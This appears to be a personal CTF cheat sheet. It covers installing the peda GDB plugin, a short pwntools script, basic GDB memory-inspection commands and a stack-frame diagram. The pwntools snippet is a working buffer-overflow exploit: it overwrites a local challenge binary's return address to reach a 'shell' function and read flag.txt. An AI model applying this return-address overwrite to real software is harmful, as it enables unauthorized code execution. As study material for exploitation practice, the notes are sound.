# peda
```sh
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```
# pwntools
```python
from pwn import *

context.binary = "./pwn1"

p = process()
p.sendline(b"A" * 128 + b"a" * 12 + p32(context.binary.functions["shell"].address))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```
# GDB commands
- `r` run
- `c` continue
- `b <function_name>` breakpoint
- `file <file>` load file
- `x/Nuf expr`: examine memory at address expr
  - N how many units to display
  - u unit size; one of b(individual bytes), h (halfwords = 2B), w (words = 4B), g (giant words = 8B)
  - f printing format (any print format) or s (s null-terminated string) i (machine instructions)
Ex: `x/168x $sp' (4 byte chunks by default) $sp = stack pointer, $rip = instruction pointer

# Stack representation
```
+---------------+ <- SP
|     locals    |
+---------------+ <- BP
|       BP      |
+---------------+
|    ret add    |
+---------------+
```
